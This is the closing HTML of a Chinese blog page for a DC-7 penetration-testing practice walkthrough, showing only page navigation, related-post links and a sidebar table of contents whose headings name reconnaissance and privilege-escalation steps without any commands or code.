+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="https://github.com/Tripse/">Tripse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://tripse.github.io/2023/05/19/DC-7/">https://tripse.github.io/2023/05/19/DC-7/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://tripse.github.io" target="_blank">Tripse Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%BC%94%E7%BB%83/">渗透测试演练</a></div><div class="post_share"><div class="social-share" data-image="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://security-note.oss-cn-hangzhou.aliyuncs.com/2.jpg" target="_blank"><img class="post-qr-code-img" src="https://security-note.oss-cn-hangzhou.aliyuncs.com/2.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://security-note.oss-cn-hangzhou.aliyuncs.com/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="https://security-note.oss-cn-hangzhou.aliyuncs.com/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/05/19/DC-8/"><img class="prev-cover" src="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">渗透测试演练 DC-8</div></div></a></div><div class="next-post pull-right"><a href="/2023/05/19/DC-6/"><img class="next-cover" src="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">渗透测试演练 DC-6</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/05/11/DC-1/" title="渗透测试演练 DC-1"><img class="cover" src="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-11</div><div class="title">渗透测试演练 DC-1</div></div></a></div><div><a href="/2023/05/19/DC-5/" title="渗透测试演练 DC-5"><img class="cover" src="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-19</div><div class="title">渗透测试演练 DC-5</div></div></a></div><div><a href="/2023/05/12/DC-2/" title="渗透测试演练 DC-2"><img class="cover" src="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-12</div><div class="title">渗透测试演练 DC-2</div></div></a></div><div><a href="/2023/05/19/DC-4/" title="渗透测试演练 DC-4"><img class="cover" src="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-19</div><div class="title">渗透测试演练 DC-4</div></div></a></div><div><a href="/2023/05/19/DC-8/" title="渗透测试演练 DC-8"><img class="cover" src="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-19</div><div class="title">渗透测试演练 DC-8</div></div></a></div><div><a href="/2023/05/19/DC-6/" title="渗透测试演练 DC-6"><img class="cover" src="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-19</div><div class="title">渗透测试演练 DC-6</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/dog1.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Tripse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Tripse/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Tripse/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:leadlifeLD@163.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://space.bilibili.com/324542959?spm_id_from=333.1007.0.0" target="_blank" title="bilibili"><i class="iconfont  icon-bilibili"></i></a><a class="social-icon" href="https://jq.qq.com/?_wv=1027&amp;k=dF6M99TL" target="_blank" title="QQ群"><i class="iconfont  icon-QQ"></i></a><a class="social-icon" href="https://tripse.github.io/wechat.html" target="_blank" title=""><i class="iconfont  icon-wechat-fill"></i></a><a class="social-icon" href="https://tieba.baidu.com/f?ie=utf-8&amp;kw=leadlife" target="_blank" title=""><i class="iconfont  icon-social-tieba"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-7"><span class="toc-number">1.</span> <span class="toc-text">DC-7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">外部信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-ICMP-%E6%89%AB%E6%8F%8F%E5%8F%91%E7%8E%B0%E4%B8%BB%E6%9C%BA"><span class="toc-number">1.1.1.</span> <span class="toc-text">Nmap ICMP 扫描发现主机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fsacn-%E6%8E%A2%E6%B5%8B%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.1.2.</span> <span class="toc-text">Fsacn 探测开放端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-%E8%BF%9B%E8%A1%8C%E8%AF%A6%E7%BB%86%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.3.</span> <span class="toc-text">Nmap 进行详细端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD-CMS"><span class="toc-number">1.1.4.</span> <span class="toc-text">判断 CMS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CMSeek-%E5%88%A4%E6%96%AD-CMS-%E7%89%88%E6%9C%AC"><span class="toc-number">1.1.5.</span> <span class="toc-text">CMSeek 判断 CMS 版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#searchsploit-%E6%90%9C%E5%AF%BB-cms-%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.6.</span> <span class="toc-text">searchsploit 搜寻 cms 版本漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96-SHELL"><span class="toc-number">1.2.</span> <span class="toc-text">获取 SHELL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B0%9D%E8%AF%95"><span class="toc-number">1.2.1.</span> <span class="toc-text">MSF 漏洞利用尝试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%8D%E6%AC%A1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.2.</span> <span class="toc-text">再次信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E9%83%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.3.</span> <span class="toc-text">内部信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E4%B8%8E%E5%8F%91%E8%A1%8C%E7%89%88"><span class="toc-number">1.3.1.</span> <span class="toc-text">内核与发行版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUID"><span class="toc-number">1.3.2.</span> <span class="toc-text">SUID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUDO"><span class="toc-number">1.3.3.</span> <span class="toc-text">SUDO</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%8D%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">降权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%98%E5%8C%96-SHELL"><span class="toc-number">1.5.</span> <span class="toc-text">优化 SHELL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.6.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%AE%9A%E6%97%B6%E8%84%9A%E6%9C%AC%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.1.</span> <span class="toc-text">修改定时脚本文件提权</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/06/07/%E4%BC%98%E7%A7%80%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/" title="优秀浏览器插件推荐"><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/BrowserPlugins.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="优秀浏览器插件推荐"/></a><div class="content"><a class="title" href="/2023/06/07/%E4%BC%98%E7%A7%80%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/" title="优秀浏览器插件推荐">优秀浏览器插件推荐</a><time datetime="2023-06-07T11:43:45.009Z" title="发表于 2023-06-07 19:43:45">2023-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/19/DC-9/" title="渗透测试演练 DC-9"><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透测试演练 DC-9"/></a><div class="content"><a class="title" href="/2023/05/19/DC-9/" title="渗透测试演练 DC-9">渗透测试演练 DC-9</a><time datetime="2023-05-19T10:42:09.757Z" title="发表于 2023-05-19 18:42:09">2023-05-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/19/DC-8/" title="渗透测试演练 DC-8"><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透测试演练 DC-8"/></a><div class="content"><a class="title" href="/2023/05/19/DC-8/" title="渗透测试演练 DC-8">渗透测试演练 DC-8</a><time datetime="2023-05-19T10:42:09.756Z" title="发表于 2023-05-19 18:42:09">2023-05-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/19/DC-7/" title="渗透测试演练 DC-7"><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透测试演练 DC-7"/></a><div class="content"><a class="title" href="/2023/05/19/DC-7/" title="渗透测试演练 DC-7">渗透测试演练 DC-7</a><time datetime="2023-05-19T10:42:09.755Z" title="发表于 2023-05-19 18:42:09">2023-05-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/19/DC-6/" title="渗透测试演练 DC-6"><img src="https://security-note.oss-cn-hangzhou.aliyuncs.com/渗透测试演练.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透测试演练 DC-6"/></a><div class="content"><a class="title" href="/2023/05/19/DC-6/" title="渗透测试演练 DC-6">渗透测试演练 DC-6</a><time datetime="2023-05-19T10:42:09.754Z" title="发表于 2023-05-19 18:42:09">2023-05-19</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By Tripse</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
